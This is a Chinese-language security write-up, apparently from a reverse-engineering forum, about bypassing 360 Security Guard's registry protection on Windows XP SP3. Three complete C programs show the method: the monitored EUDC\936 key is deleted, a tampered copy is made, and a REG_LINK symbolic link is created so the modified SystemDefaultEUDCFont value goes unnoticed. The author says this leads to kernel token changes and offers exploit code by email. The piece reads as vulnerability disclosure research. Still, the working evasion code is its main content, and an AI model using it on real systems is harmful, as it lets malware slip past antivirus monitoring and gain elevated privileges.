
# 利用 `REG_LINK` 绕过 360 等注册表监控

> 原文：[`www.pediy.com/kssd/pediy12/131169.html`](https://www.pediy.com/kssd/pediy12/131169.html)

## 一.测试环境

鉴于 XP 和 360 的市场占有率，故本次测试所采用的操作系统为中文版 Windows XP SP3（使用 360 安全卫士更新了所有补丁），360 安全卫士 7.7（备用木马库 2011-03-21），360 杀毒软件 2.0.0.1330（病毒库日期 2011-03-22 02:57），计算机处于联网状态，360 安全卫士、360 杀毒都“已成功连接至 360 云安全中心”。建立了一个名为 `admin` 的管理员用户，`whoami` 信息如下：

`C:\Documents and Settings\admin>whoami /user`

用户信息

`----------------`

用户名   SID

`======== ============================================`

`qq\admin S-1-5-21-507921405-343818398-1606980848-1005`

## 二.测试

### 1.测试 1

```c
#include <windows.h>

void main()
{
  BYTE  RegBuf[0x28] = {0};
  HKEY  hKey;
  if ( RegOpenKey(HKEY_CURRENT_USER,L"EUDC\\936",&hKey) == ERROR_SUCCESS )
  {
    RegSetValueEx(hKey, L"SystemDefaultEUDCFont", 0, REG_BINARY, RegBuf, 0x28);
    RegCloseKey(hKey);
  }
}
```

编译后运行，360 木马防火墙提示风险“发现程序正在修改系统关键设置”。选择“阻止本次操作”，点确定后 `HKEY_USERS\S-1-5-21-507921405-343818398-1606980848-1005\EUDC\936` 下 `SystemDefaultEUDCFont` 的数据以及类型没有被修改。

### 2.测试 2

```c
#include <windows.h>

void main()
{
  RegDeleteKey(HKEY_CURRENT_USER,L"EUDC\\936");
}
```

编译后运行，360 无任何提示，`HKEY_USERS\S-1-5-21-507921405-343818398-1606980848-1005\EUDC\936` 成功删除。

漏洞就在这里。我们可以把 `HKEY_USERS\(用户 SID)\EUDC\936` 所有数值复制到另外一个项 `HKEY_USERS\(用户 SID)\936Temp` 里面，修改 `936Temp` 里面的 `SystemDefaultEUDCFont` 数值类型和数据，修改时 360 不报。然后删除 `HKEY_USERS\(用户 SID)\EUDC\936`，再建立一个同名的 `HKEY_USERS\(用户 SID)\EUDC\936` 项（`REG_OPTION_CREATE_LINK`），设置 `SymbolicLinkValue` 键值指向 `936Temp`。这样无论是用户态还是内核态里面读取 `HKEY_USERS\(用户 SID)\EUDC\936` 项下面的 `SystemDefaultEUDCFont` 数值，其实都是读取 `HKEY_USERS\(用户 SID)\936Temp` 项下的 `SystemDefaultEUDCFont` 数值。

### 3.测试 3

恢复原 `HKEY_USERS\S-1-5-21-507921405-343818398-1606980848-1005\EUDC\936`。

```c
#include <windows.h>
#include <Shlwapi.h>

#pragma comment(lib,"shlwapi.lib")

void main()
{
  BYTE  RegBuf[0x28] = {0};
  HKEY  k1,link;
  RegCreateKey(HKEY_CURRENT_USER, L"936Temp",&k1);
  SHCopyKey(HKEY_CURRENT_USER,L"EUDC\\936",k1,0);
  RegSetValueEx(k1, L"SystemDefaultEUDCFont", 0, REG_BINARY, RegBuf, 0x28);
  RegDeleteKey(HKEY_CURRENT_USER,L"EUDC\\936");
  WCHAR*  linkto=L"\\REGISTRY\\USER\\S-1-5-21-507921405-343818398-1606980848-1005\\936Temp";
  RegCreateKeyEx(HKEY_CURRENT_USER, L"EUDC\\936", 0, NULL, REG_OPTION_VOLATILE | REG_OPTION_CREATE_LINK, KEY_CREATE_LINK|KEY_SET_VALUE, NULL, &link, NULL);
  RegSetValueEx(link, L"SymbolicLinkValue", 0, REG_LINK, (BYTE *)linkto, wcslen(linkto)* sizeof(WCHAR));
  RegCloseKey(k1);
  RegCloseKey(link);
}
```

编译后运行，360 无任何提示。运行 `regedit.exe`，可以看到 `HKEY_USERS\S-1-5-21-507921405-343818398-1606980848-1005\EUDC\936` 项下面的 `SystemDefaultEUDCFont` 数值类型为 `REG_BINARY`，数值数据是一连串的 0。

### 4.实际应用

在 XP 下改 EUDC 进内核还得过 gs cookie，当然，改某些地方也可以不用过 gs cookie，你懂的。

需要实际进内核改 Token、加驱动的源代码以及 EXE 的话可以发邮件到 `KiDebug@163.com`，我会提供的。（注意，只提供给相关安全公司，在防御好了后我再公布出来。）

## 三、背景、感谢、参考资料

第一次看到 `REG_LINK` 的存在是在 j00ru 的文章《Windows XP SP3 Kernel Registry Handling Denial of Service》，在尝试能不拦不报不弹窗删除 `HKEY_USERS\(用户 SID)\EUDC\936` 后，意识到可以利用 `REG_LINK`，于是百度了一下“REG_LINK site:debugman.com”，搜索到了 MJ0011 的文章《继续爆料之注册表也 LINK》。

感谢 j00ru、MJ0011 两位前辈!

《Windows XP SP3 Kernel Registry Handling Denial of Service》：

`http://vexillium.org/dl.php?HISPSAEC_Local_DoS2.pdf`

《继续爆料之注册表也 LINK》：

`http://www.debugman.com/discussion/2069/%E7%BB%A7%E7%BB%AD%E7%88%86%E6%96%99%E4%B9%8B%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B9%9Flink/p1`
